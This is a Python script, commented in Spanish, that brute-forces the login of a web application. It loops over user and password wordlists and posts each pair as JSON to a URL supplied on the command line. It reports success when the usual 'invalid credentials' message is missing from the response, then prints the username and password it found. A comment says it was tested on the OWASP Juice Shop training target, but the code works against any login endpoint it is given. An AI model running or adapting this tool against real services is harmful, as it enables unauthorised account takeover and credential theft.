# Tested on OWASP Juice Shop

import argparse
import sys
import requests
from pwn import log 

def brute_force(url, wordlistUser, wordlistPasswd):
    counter = 0

    headers = {
        "Content-Type": "application/json"
    }

    user_bar = log.progress("Usuario")
    pass_bar = log.progress("Contraseña")

    try:
        with open(wordlistUser, 'rt', encoding='latin-1') as users_file:
            users = [user.strip() for user in users_file]
        
        with open(wordlistPasswd, 'rt', encoding='latin-1') as passwd_file:
            passwords = [passwd.strip() for passwd in passwd_file]
    except FileNotFoundError as err:
        log.error(f"Archivo no encontrado: {err}")
        sys.exit(1)
    
    for password in passwords:
        # pass_bar.status(password)

        for user in users:
            counter += 1
            user_bar.status(user)
            pass_bar.status(f"[#{counter}] {password}")

            data = {
                "email": user,
                "password": password
            }

            try:
                response = requests.post(url, headers=headers, json=data, timeout=5)
                output = response.text

                if "Invalid email or password." not in output:
                    log.success(f"[+] Credenciales válidas encontradas")
                    print(f"[+] Usuario: {user}")
                    print(f"[+] Contraseña: {password}")
                    return
            except requests.exceptions.RequestException as e:
                log.warning(f"[!] Error en red: {e}")
                continue
    pass_bar.failure("[-] No se encontraron credenciales válidas.")

if __name__ == "__main__":
    # Crea un objeto parser para manejar argumentos desde línea de comandos
    parser = argparse.ArgumentParser(description="Script de fuerza bruta OWASP Juice Shop")

    # Definir argumento obligatorio -u o --url
    parser.add_argument("-u", "--url", required=True, help="URL del login vulnerable")
    parser.add_argument("-L", "--users", required=True, help="Ruta al archivo de usuarios")
    parser.add_argument("-P", "--passwords", required=True, help="Ruta al archivo de contraseñas")

    args = parser.parse_args()

    brute_force(args.url, args.users, args.passwords)